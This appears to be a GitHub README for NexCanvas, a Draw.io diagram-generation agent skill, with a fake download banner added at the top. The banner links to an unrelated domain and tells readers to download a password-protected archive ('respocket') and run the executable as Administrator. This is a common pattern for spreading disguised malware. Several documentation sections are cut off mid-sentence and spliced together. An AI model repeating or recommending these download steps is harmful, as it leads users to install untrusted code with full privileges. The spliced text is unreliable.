<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<div align="center">

## Why NexCanvas exists

Most diagram automation stops when XML is valid. NexCanvas treats that as the
beginning, not the finish line. It addresses four recurring failures in
agent-generated architecture diagrams:

- unsupported architecture invented from an incomplete prompt;
- every problem forced into the same columns or generic card grid;
- logos that disappear after cloning or silently represent the wrong product;
- connectors, labels, badges, icons, and boundaries that collide in the final render.

The result is an editable `.drawio` artifact backed by evidence, semantic models,
local assets, machine-readable QA reports, and an inspected preview.

## Showcase

| Compact phase architecture | Hub-and-spoke analytical architecture |
|---|---|
## What the skill does

| Capability | Behavior |
|---|---|
| Semantic intent | Infers architecture, workflow, sequence, data-flow, or lifecycle from the brief without forcing a type questionnaire |
| Evidence contract | Records confirmed facts, assumptions, exclusions, and source snapshots before drawing; repository facts can be pinned to Git origin, revision, blob, file, and line range |
| Incremental repository sync | Analyzes Python and TypeScript/JavaScript modules, previews semantic diffs, and three-way merges source changes without overwriting manual presentation |
| Technical routing | Selects from 9 diagram families and 48 profiles across software, cloud, data, security, delivery, product, and AI/ML |
| Layout brainstorming | Scores phase columns, dense columns, rows, compact pipelines, hub-and-spoke, and hybrid compositions before geometry is locked |
| Reference grammar | Supports provider-neutral and Microsoft/AWS/Google-style icon-led architecture diagrams |
| Asset portability | Verifies and hashes SVG sources, stores them locally, and embeds them into the Draw.io artifact |
| Native output | Produces inspectable, uncompressed mxGraph XML instead of pasting a bitmap onto a canvas |
| Collision QA | Rejects node, icon, label, step-badge, connector-lane, and visible boundary-outline collisions |
| Visual proof | Renders through Draw.io Desktop, requires human/agent image inspection, then seals hashes at postflight |
| Cross-agent conformance | Uses one shared skill, hash-bound host run packs, five-dimensional scoring, and explicit verified/not-run/unavailable/failed states |
| Extension API | Loads versioned analyzer, layout, route, asset-provider, QA-rule, and host adapters only from explicitly trusted directories |
| Visual benchmarks | Gates sparse, dense, cloud, AI, sequence, data-flow, and lifecycle baselines across geometry, text bounds, image proxies, and hash-bound human review |
| Stable contracts | Publishes a machine-readable CLI/schema/platform manifest and read-only compatibility checks for existing projects |

## Agent-guided intake

Describe the system or process and specify the diagram language. That is enough
to start; you do not need to choose a diagram category, style, or canvas.

For example: "Draw a multi-agent system with one coordinator and specialist agents.
Use English." The agent derives the structure, compares layouts, builds an editable
diagram, and inspects the rendered result. Unspecified conceptual roles are recorded
as assumptions. When documenting an existing system, the agent inspects its sources.

The agent asks only for missing language or a content ambiguity that would change
the meaning of the diagram. Explicit visual references and output preferences remain
active for later examples and revisions until changed. See the
### Five semantic views

The five intents describe the question being answered, not the appearance of the diagram:

| Intent | Answers |
|---|---|
| Architecture | What components exist, where are they, and what depends on what? |
| Workflow | What work happens from trigger to outcome, including branches and approvals? |
| Sequence | Who exchanges messages, in what order, for one bounded interaction? |
| Data flow | Where does data originate, transform, persist, and get consumed? |
| Lifecycle | Which states can one entity enter, and what triggers each transition? |

## Where generated output goes

The default project location is deliberately outside the installed skill:

```text
<your-current-repository>/
└── nexcanvas-output/
    └── <project-slug>/
        ├── source_model.json
        ├── diagram_lock.json
        ├── diagram_model.json
        ├── project_state.json
        ├── repository_snapshot.json      # after a completed repository sync
        ├── assets/
        │   ├── asset_manifest.json
        │   └── icons/
        ├── artifacts/
        │   ├── diagram.drawio
        │   └── diagram.drawio.png
        └── reports/
            ├── runtime.json
            ├── repository_evidence.json
            ├── layout_brainstorm.json
            ├── build.json
            ├── diagram_qa.json
            ├── render.json
            ├── visual_qa.json
            ├── semantic_sync.json
            └── postflight.json
```

`repository_evidence.json` is emitted only for repository-backed diagrams. Other
reports are produced as their corresponding build, render, and review stages run.

### Canonical Semantic Model V3

New projects use `diagram_model.json` schema `3.0`. Its three layers prevent a
layout adjustment from masquerading as an architecture change:

| Layer | Responsibility |
|---|---|
| `metadata` | View intent, route, audience, language, delivery context, and evidence-model link |
| `semantics` | Stable groups, entities, relationships, endpoints, and fact-level provenance |
| `presentation` | Theme, canvas, icons, emphasis, geometry, labels, connector lanes, ports, and routes |

Generated Draw.io, previews, and QA reports stay outside the canonical model.
V3 output carries both a full model hash and a semantics-only fingerprint, so
repository sync can distinguish meaning from presentation edits. See the
## Install as an Agent Skill

NexCanvas follows the open Agent Skills directory convention: keep this entire
repository together so `SKILL.md` can reach its scripts, references, schemas,
configuration, and assets.

| Host | Project-scoped installation | Invocation |
|---|---|---|
| OpenAI Codex | `.agents/skills/nexcanvas-drawio/` | Ask naturally or use `$nexcanvas-drawio` |
| GitHub Copilot | `.github/skills/nexcanvas-drawio/` | Ask Copilot to use `nexcanvas-drawio` |
| Claude Code | `.claude/skills/nexcanvas-drawio/` | Ask naturally or use `/nexcanvas-drawio` |

### OpenAI Codex

```bash
mkdir -p .agents/skills
### GitHub Copilot

```bash
mkdir -p .github/skills
### Claude Code

```bash
mkdir -p .claude/skills
### Example prompts

```text
Use NexCanvas Draw.io to investigate this repository and create a deployment
architecture for engineering onboarding. Ask only for unresolved decisions.
```

```text
Recreate this Microsoft architecture reference as editable Draw.io. Preserve its
visual grammar, but derive the topology from my system description.
```

```text
Repair this .drawio: eliminate overlapping connector lanes and keep all labels
clear of icons, step badges, and container outlines. Render and verify it.
```

## Quick start from the command line

Requirements:

- Python 3.10 through 3.13 for authoring and structural QA;
- Draw.io Desktop for deterministic PNG/SVG/PDF export and complete visual QA;
- network access only when an icon must be synced and is not already local.

Install an editable checkout for development:

```bash
### Repository-backed diagrams

When the diagram must reflect a real codebase, capture the current Git identity before authoring facts:

```bash
nexcanvas analyze capture . --source-model "$PROJECT/source_model.json" --source-id repo-1
```

Add repo-relative file and line ranges to fact evidence, then verify the exact origin, full commit, optional blob hash, and range. Pass the repository root again to release QA and postflight so provenance is rechecked rather than trusted from an old report:

```bash
nexcanvas analyze verify "$PROJECT/source_model.json" --repo-root . --output "$PROJECT/reports/repository_evidence.json"
nexcanvas generate "$PROJECT" --repo-root .
nexcanvas generate "$PROJECT" --repo-root . --approve-visual --reviewer "Your name" --notes "Inspected at target size and traced connector terminals at 200%"
```

This verifies the authored evidence. It does not claim to discover live infrastructure, infer unknown ownership, or prove runtime behavior.

### Incremental repository sync

When a repository-backed V3 diagram already exists, preview the semantic update
before changing project files:

```bash
nexcanvas sync "$PROJECT" --repo-root . --dry-run
```

The analyzer reads Git-tracked Python, TypeScript, JavaScript, TSX, JSX, MTS,
CTS, MJS, and CJS modules at the pinned `HEAD`. It extracts public top-level
symbols and statically resolvable internal imports. Use repeated `--include` and
`--exclude` options to keep the analysis aligned with the diagram's scope.

After reviewing `operations`, `conflicts`, `pendingRemovals`, and diagnostics,
apply safe changes:

```bash
nexcanvas sync "$PROJECT" --repo-root . --apply
```

Removals are retained until each stable semantic ID is explicitly approved:

```bash
nexcanvas sync "$PROJECT" --repo-root . --apply \
  --confirm-removal repo-module-example \
  --confirm-removal repo-import-example
```

Three-way reconciliation compares the last applied repository snapshot, the new
source revision, and the current user-edited model. Source-only fields update;
user-only fields remain; same-field conflicts preserve the current value and are
reported. Existing annotations, positions, assets, boundaries, labels, ports,
and unaffected connector lanes are not regenerated. Complete the update by
running `generate --repo-root .`, inspecting the new render, and approving that
## Reliable icons and logos

Catalog assets are resolved before drawing:

```bash
nexcanvas asset search postgresql
nexcanvas asset sync nexcanvas-output/my-architecture postgresql
```

Azure reference projects can sync exact assets from Microsoft's official
Architecture Icons package:

```bash
nexcanvas asset sync nexcanvas-output/my-architecture azure-functions --provider microsoft-azure-official --accept-terms
nexcanvas asset sync nexcanvas-output/my-architecture azure-ai-search --provider microsoft-azure-official --accept-terms
```

AWS and Google Cloud projects accept an official provider ZIP through
`--source-archive`. The resolver checks SVG safety, records source/version/hash
and license metadata, copies the asset into the project, and embeds it in the
editable Draw.io XML. If no exact verified logo exists, the skill uses a neutral
semantic glyph or reports `NeedsManual`; it does not improvise a brand mark.

## Layout and visual grammar

NexCanvas does not equate “architecture diagram” with one template. It chooses
composition after the semantic model is stable:

- **phase columns** for short left-to-right pipelines;
- **dense phase columns** for parallel hot/cold paths and substantial lifecycle views;
- **phase rows** when vertical progression shortens routes;
- **compact pipeline** for a small number of strong stages;
- **hub-and-spoke** for a real analytical, integration, or control center;
- **hybrid grid** when a main flow needs subordinate feedback, governance, or topology.

Provider-reference mode uses restrained neutral zones, official icon-led
services, numbered handoffs, orthogonal routing, and a foundation band. See
## Quality gates

A project is complete only when:

1. one dominant semantic intent is resolved and compatible with the specialized route;
2. source facts are confirmed or explicitly marked as assumptions, and repository ranges are revision-verified when present;
3. route/profile requirements and model references are valid;
4. requested assets are exact, local, embedded, and renderable;
5. connectors have explicit semantics, independent lanes, correct direction, and distinct service ports for independent fan-in/fan-out relationships;
6. labels do not overlap nodes, icons, badges, connector strokes, or visible boundary outlines;
7. incoming and outgoing edges cannot form an accidental visual relay through a service, and title/legend chrome matches the model;
8. automated QA has zero errors and zero actionable warnings;
9. the rendered image was traced end to end at delivery size and connector terminals were inspected enlarged;
10. postflight confirms that source, model, lock, render, and approval hashes still match.

When Draw.io Desktop is unavailable, the portable tier can still generate and
structurally validate editable `.drawio`, but visual approval remains pending.

## Repository structure

```text
SKILL.md                          portable agent instructions
agents/openai.yaml               optional Codex interface metadata
workflows/                       generate, repository-sync, repair, and reference-conversion flows
references/                      notation, intake, layout, asset, and QA contracts
config/                          route, theme, archetype, and provider registries
schemas/                         JSON contracts
src/nexcanvas/                   installable compiler and unified CLI package
scripts/nexcanvas_cli.py         installation-free source-checkout launcher
scripts/*.py                     deprecated v0.1 compatibility entry points
tests/                           unit and reference-project tests
examples/v2-rag-reference/       compact phase reference
examples/v3-dense-industrial-ai/ dense industrial AI reference
examples/v4-hub-spoke-industrial/ hub-and-spoke reference
examples/v5-multi-agent-workflow/ multi-agent orchestration workflow
benchmarks/                       seven-class visual corpus and hash-bound baselines
nexcanvas-output/                documented default generated-output root
```

## Extension ecosystem

Extensions use one manifest/API contract and enter the actual compiler boundary;
they are not prompt snippets or registry labels with no runtime effect. The six
component kinds cover repository analyzers, layouts, routes, asset providers, QA
rules, and agent-host adapters.

```bash
nexcanvas extension validate ./my-extension
nexcanvas init ./project --name "Service map" --family custom --profile service-map --extension ./my-extension
nexcanvas analyze snapshot ./repo --extension ./my-extension
nexcanvas build diagram_model.json -o diagram.drawio --extension ./my-extension
nexcanvas generate ./project --extension ./my-extension
```

Loading is always explicit. Executable hooks use a versioned JSON stdin/stdout
protocol, bounded timeout, `shell=False`, confined resource paths, and validated
responses. The resumable pipeline fingerprints the manifest and every declared
hook/resource, so an extension change invalidates affected generated stages.
Hooks are trusted local code, not sandboxed code. Read the
## Visual benchmark suite

The tracked benchmark corpus covers sparse, dense, cloud, AI, sequence,
data-flow, and lifecycle diagrams. It separates geometry failures, text-bound
collisions, deterministic PNG proxies, and human visual approval:

```bash
nexcanvas benchmark validate
nexcanvas benchmark run
```

Each approval is bound to the rendered PNG hash. `--automated-only` is suitable
for CI diagnostics but intentionally cannot claim a release-grade visual pass.
## Development and validation

```bash
python -m pip install -e .
python -m unittest discover -s tests -v
python scripts/test_drawio_qa.py -v
python scripts/validate_conformance.py
nexcanvas benchmark run
nexcanvas doctor
python scripts/package_smoke.py
```

The implementation uses the Python standard library for its core contract,
layout, build, and QA pipeline. This keeps the same skill usable by Codex,
GitHub Copilot, Claude Code, and other hosts that implement Agent Skills.

The complete command surface, exit-code contract, installation behavior, and
## Cross-agent conformance

NexCanvas does not call two prompts equivalent merely because their screenshots
look similar. The Phase 6 harness evaluates semantic coverage, source evidence,
assets, routing/layout decisions, and completed delivery gates against a versioned
five-intent corpus. Fixture baselines test the evaluator and never verify a host.

```bash
nexcanvas conformance doctor
nexcanvas conformance prepare multi-agent-workflow --host codex --output conformance-run
nexcanvas conformance evaluate conformance-run/request.json --project conformance-run/project --mode observed --execution conformance-run/execution.json
```

## Project governance

NexCanvas is developed on a protected, always-releasable `main` branch. Changes
are proposed through short-lived branches and pull requests, and releases follow
Semantic Versioning with separate versioning for persisted JSON schemas.


---

# Security policy

## Supported versions

| Version | Supported |
|---|---|
| Latest `1.x` minor | Security and correctness fixes |
| Previous `1.x` minor | Security fixes for 90 days after the next minor release |
| `0.x` technical previews | No |
| Unreleased `main` | Best effort |
| Other snapshots | No |

## Reporting a vulnerability

Do not open a public issue for a suspected vulnerability. Use GitHub's private
## Security-sensitive areas

Asset downloads, archive extraction, SVG parsing, file-path resolution, repository
inspection, generated XML, and agent-provided inputs require particular care.
Security fixes may intentionally break compatibility when preserving compatibility
would leave users exposed.


---

# Contributing to NexCanvas

Thank you for helping improve evidence-grounded, editable technical diagrams.
Contributions are welcome as focused issues, test cases, documentation, bug fixes,
diagram profiles, asset providers, QA rules, and implementation changes.

## Before opening a change

1. Search existing issues and pull requests.
2. For a substantial contract or architecture change, open a proposal issue first.
3. Keep one pull request focused on one reviewable outcome.
4. Do not include credentials, private repositories, confidential diagrams, or
   unlicensed assets in fixtures.

## Local validation

NexCanvas core development requires Python 3.10 or newer and uses the standard
library. Draw.io Desktop is optional for structural development but required for
claiming rendered visual verification.

From the repository root, run:

```bash
python -m pip install -e .
python -m unittest discover -s tests -v
python scripts/test_drawio_qa.py -v
python scripts/validate_skill.py
python scripts/validate_conformance.py
nexcanvas doctor
python scripts/package_smoke.py
```

Validate tracked reference projects:

```bash
nexcanvas postflight examples/v2-rag-reference
nexcanvas postflight examples/v3-dense-industrial-ai
nexcanvas postflight examples/v4-hub-spoke-industrial
nexcanvas postflight examples/v5-multi-agent-workflow
```

## Branch and commit conventions

Create a short-lived branch from current `main`:

```text
feat/semantic-diff
fix/connector-routing
docs/asset-policy
test/dense-fan-in
refactor/package-layout
chore/release-config
```

Pull-request titles use Conventional Commit form because the squash-merge title
feeds release automation:

```text
feat(sync): add a semantic repository diff
fix(qa): reject ambiguous same-port relays
docs(contributing): explain asset provenance evidence
feat(schema)!: introduce semantic model V3
```

Branches are deleted after merge. `main` is the only permanent branch until a
supported release line genuinely requires a maintenance branch.

## Pull-request requirements

Every pull request must:

- explain the user-visible problem and chosen solution;
- identify public-contract or schema impact;
- include meaningful tests for changed behavior;
- keep all existing tests green;
- update documentation and migrations when required;
- avoid unrelated generated files or refactors;
- pass the stable CI quality gate.

Diagram, layout, connector, or visual QA changes must also include a minimal
fixture and before/after previews where the visual effect is material. The PR must
state whether Draw.io rendering was actually performed and visually inspected.

Asset contributions must record the exact product, owner, source URL, terms,
version, local path, and checksum. Never add an approximate neighboring product
logo as a substitute.

## Review principles

Reviews prioritize semantic correctness, evidence quality, editability,
portability, deterministic enforcement, and rendered clarity. XML validity alone
does not establish visual quality.

Maintainers may request that a large proposal be split into smaller pull requests.
Incomplete experimental behavior should remain behind an explicit experimental
interface and must not silently change stable output.

## Licensing

By submitting a contribution, you agree that it is licensed under the repository's


---

MIT License

Copyright (c) 2026 Le Quang Vinh

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
